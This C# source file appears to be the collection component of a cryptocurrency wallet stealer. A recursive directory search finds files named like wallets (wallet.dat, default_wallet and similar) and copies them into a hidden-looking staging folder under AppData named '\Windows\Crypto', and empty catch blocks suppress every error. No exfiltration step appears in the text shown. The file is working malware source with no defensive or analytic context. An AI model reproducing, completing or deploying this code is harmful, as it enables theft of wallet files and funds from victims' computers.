using System;
using System.IO;


namespace cr
{
    class crypto
    {
        public static void DirSearch(string sDir)
        {
            try
            {
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    try
                    {
                        if (d == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft") continue;
                        if (d == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Application Data") continue;
                        if (d == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\History") continue;
                        if (d == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft") continue;
                        if (d == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temporary Internet Files") continue;
                        string[] files = Directory.GetFiles(d);
                        foreach (string f in files)
                        {
                            FileInfo ff = new FileInfo(f);
                            if (ff.Name == "wallet.dat" || ff.Name == "wallet" || ff.Name == "default_wallet.dat" || ff.Name == "default_wallet" || ff.Name.EndsWith("wallet") || ff.Name.EndsWith("bit")  || ff.Name.StartsWith("wallet"))
                            {
                                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Crypto");
                                try
                                {
                                    if (ff.Name.EndsWith(".log"))
                                    {
                                        continue;
                                    }
                                    string newpath = new DirectoryInfo(d).Name;
                                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Crypto\" + newpath);
                                    File.Copy(f, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Crypto\" + newpath + @"\" + ff.Name);
                                }
                                catch
                                {
                                }

                            }
                        }
                    }
                    catch
                    {
                    }

                    DirSearch(d);
                }
            }
            catch
            {

            }
        }

    }
}
